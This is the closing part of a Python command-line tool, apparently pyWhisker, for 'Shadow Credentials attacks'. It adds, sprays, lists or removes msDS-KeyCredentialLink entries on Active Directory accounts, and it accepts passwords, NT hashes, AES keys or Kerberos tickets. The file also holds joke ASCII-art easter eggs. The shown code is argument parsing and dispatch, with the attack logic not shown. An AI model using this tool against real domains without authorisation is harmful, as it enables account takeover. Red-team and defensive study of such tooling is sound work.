    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
    ⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
    ⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
    ⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
    ⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
    ⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
    ⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁

⠀ 🈵⠀STOP INCREASING VERBOSITY (PUNK!) 🈵⠀
"""
            print(art)
            exit(0)

        elif verbosity == 6:
            art = """
    ⣿⣿⣿⣿⣿⣿⠟⠋⠁⣀⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿
    ⣿⣿⣿⣿⠋⠁⠀⠀⠺⠿⢿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿
    ⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⠀⠀⠀⠀⠀⣤⣦⣄⠀⠀
    ⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⠏⣿⣿⣿⣿⣿⣁⠀⠀⠀⠛⠙⠛⠋⠀⠀
    ⡿⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣰⣿⣿⣿⣿⡄⠘⣿⣿⣿⣿⣷⠄⠀⠀⠀⠀⠀⠀⠀⠀
    ⡇⠀⠀⠀⠀⠀⠀⠀⠸⠇⣼⣿⣿⣿⣿⣿⣷⣄⠘⢿⣿⣿⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀
    ⠁⠀⠀⠀⣴⣿⠀⣐⣣⣸⣿⣿⣿⣿⣿⠟⠛⠛⠀⠌⠻⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣶⣮⣽⣰⣿⡿⢿⣿⣿⣿⣿⣿⡀⢿⣤⠄⢠⣄⢹⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣿⣿⣿⣿⣿⡘⣿⣿⣿⣿⣿⣿⠿⣶⣶⣾⣿⣿⡆⢻⣿⣿⠃⢠⠖⠛⣛⣷⠀
    ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣮⣝⡻⠿⠿⢃⣄⣭⡟⢀⡎⣰⡶⣪⣿⠀
    ⠀⠀⠘⣿⣿⣿⠟⣛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡿⢁⣾⣿⢿⣿⣿⠏⠀
    ⠀⠀⠀⣻⣿⡟⠘⠿⠿⠎⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣿⣿⠧⣷⠟⠁⠀⠀
    ⡇⠀⠀⢹⣿⡧⠀⡀⠀⣀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢰⣿⠀⠀⠀⠀
    ⡇⠀⠀⠀⢻⢰⣿⣶⣿⡿⠿⢂⣿⣿⣿⣿⣿⣿⣿⢿⣻⣿⣿⣿⡏⠀⠀⠁⠀⠀⠀⠀
    ⣷⠀⠀⠀⠀⠈⠿⠟⣁⣴⣾⣿⣿⠿⠿⣛⣋⣥⣶⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
    
    yamete kudasai !!!
"""
            print(art)
            exit(0)
        elif verbosity > 6:
            print("Sorry bruh, no more easter eggs")
            exit(0)

    def debug(self, message):
        if self.verbosity == 2:
            self.console.print("{}[DEBUG]{} {}".format("[yellow3]", "[/yellow3]", message), highlight=False)

    def verbose(self, message):
        if self.verbosity >= 1:
            self.console.print("{}[VERBOSE]{} {}".format("[blue]", "[/blue]", message), highlight=False)

    def info(self, message):
        if not self.quiet:
            self.console.print("{}[*]{} {}".format("[bold blue]", "[/bold blue]", message), highlight=False)

    def success(self, message):
        if not self.quiet:
            self.console.print("{}[+]{} {}".format("[bold green]", "[/bold green]", message), highlight=False)

    def warning(self, message):
        if not self.quiet:
            self.console.print("{}[-]{} {}".format("[bold orange3]", "[/bold orange3]", message), highlight=False)

    def error(self, message):
        if not self.quiet:
            self.console.print("{}[!]{} {}".format("[bold red]", "[/bold red]", message), highlight=False)


def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Python (re)setter for property msDS-KeyCredentialLink for Shadow Credentials attacks.')
    target = parser.add_mutually_exclusive_group(required=True)
    target.add_argument("-t", "--target", type=str, dest="target_samname", help="Target account")
    target.add_argument("-tl", "--target-list", type=str, dest="target_samname_list", help="Path to a file with target accounts names (one per line)")

    parser.add_argument("-a", "--action", choices=['list', 'add', 'spray', 'remove', 'clear', 'info', 'export', 'import'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
    parser.add_argument('--use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument('--use-schannel', action='store_true', help='Use LDAP Schannel (TLS) for certificate-based authentication')
    parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
    parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")

    authconn = parser.add_argument_group('authentication & connection')
    authconn.add_argument('--dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
    authconn.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
    authconn.add_argument("-u", "--user", dest="auth_username", metavar="USER", action="store", help="user to authenticate with")
    authconn.add_argument("-crt", "--certfile", dest="crt", metavar="CERTFILE", help="Path to the user certificate (PEM format) for Schannel authentication")
    authconn.add_argument("-key", "--keyfile", dest="key", metavar="KEYFILE", help="Path to the user private key (PEM format) for Schannel authentication")
    authconn.add_argument("-td", "--target-domain", type=str, dest="target_domain", help="Target domain (if different than the domain of the authenticating user)")

    secret = parser.add_argument_group()
    cred = secret.add_mutually_exclusive_group()
    cred.add_argument('--no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    cred.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
    cred.add_argument("-H", "--hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help='NT/LM hashes, format is LMhash:NThash')
    cred.add_argument('--aes-key', dest="auth_key", action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')

    add = parser.add_argument_group('arguments when setting -action to add')
    add.add_argument("-P", "--pfx-password", action='store', help='password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)')
    add.add_argument("-f", "--filename", action='store', help='filename to store the generated self-signed PEM or PFX certificate and key, or filename for the "import"/"export" actions')
    add.add_argument("-e", "--export", action='store', choices=["PEM","PFX"], type = lambda s : s.upper(), default="PFX", help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')

    remove = parser.add_argument_group('arguments when setting -action to remove')
    remove.add_argument("-D", "--device-id", action='store', help='device ID of the KeyCredentialLink to remove when setting -action to remove')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    if (args.action == "remove" or args.action == "info") and args.device_id is None:
        parser.error("the following arguments are required when setting -action == remove or info: -D/--device-id")

    if args.action == "import" and args.filename is None:
        parser.error("the following arguments are required when setting -action == import or info: -f/--filename")

    return args


def main():
    #if args.action == 'write' and args.delegate_from is None:
        #logger.error('`-delegate-from` should be specified when using `-action write` !')
        #sys.exit(1)
    args = parse_args()
    logger = Logger(args.verbosity, args.quiet)

    if args.target_samname_list and args.action != 'spray':
        logger.error('`--target-list` should be specified only when using `--action spray` !')
        sys.exit(1)

    if args.target_samname_list:
        if os.path.isfile(args.target_samname_list):
            with open(args.target_samname_list, 'r') as f:
                target_samname = f.read().splitlines()
        else:
            logger.error(f'File {args.target_samname_list} does not exist!')
            sys.exit(1)
    else:
        target_samname = args.target_samname

    target_domain = args.target_domain

    auth_lm_hash = ""
    auth_nt_hash = ""
    if args.auth_hashes is not None:
        if ":" in args.auth_hashes:
            auth_lm_hash = args.auth_hashes.split(":")[0]
            auth_nt_hash = args.auth_hashes.split(":")[1]
        else:
            auth_nt_hash = args.auth_hashes

    try:
        ldap_server, ldap_session = init_ldap_session(args=args, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash, logger=logger)
        shadowcreds = ShadowCredentials(ldap_server, ldap_session, target_samname, target_domain, logger)
        if args.action == 'list':
            shadowcreds.list()
        elif args.action == 'add':
            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, target_domain=target_domain)
        elif args.action == 'spray':
            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, target_domain=target_domain)
        elif args.action == 'remove':
            shadowcreds.remove(args.device_id)
        elif args.action == 'info':
            shadowcreds.info(args.device_id)
        elif args.action == 'clear':
            shadowcreds.clear()
        elif args.action == 'export':
            shadowcreds.exportToJSON(filename=args.filename)
        elif args.action == 'import':
            shadowcreds.importFromJSON(filename=args.filename)
    except Exception as e:
        if args.verbosity >= 1:
            traceback.print_exc()
        logger.error(str(e))

if __name__ == '__main__':
    main()
